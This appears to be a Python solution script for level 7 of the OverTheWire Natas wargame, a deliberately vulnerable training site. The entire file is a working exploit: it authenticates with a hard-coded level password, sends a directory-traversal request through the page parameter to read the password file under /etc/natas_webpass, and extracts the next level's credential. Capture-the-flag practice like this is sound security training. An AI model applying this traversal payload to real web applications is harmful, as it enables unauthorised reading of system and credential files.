#!/usr/bin/env python3
import requests
import re
from html import unescape

with open('natas7.html', 'w+') as out:
    username = 'natas7'
    password = 'jmxSiH3SP6Sonf8dv66ng8v1cIEdjXWr'
    
    s = requests.session()

    url = 'http://%s.natas.labs.overthewire.org' % username 

    r = s.get(url+'/index.php?page=../../../../etc/natas_webpass/natas8', auth = (username, password))
    content = r.text
    
    # out.write(content)
    print(re.findall('<br>\n(.*)\n\n<!--',content)[0])
    out.write(re.findall('<br>\n(.*)\n\n<!--', content)[0])


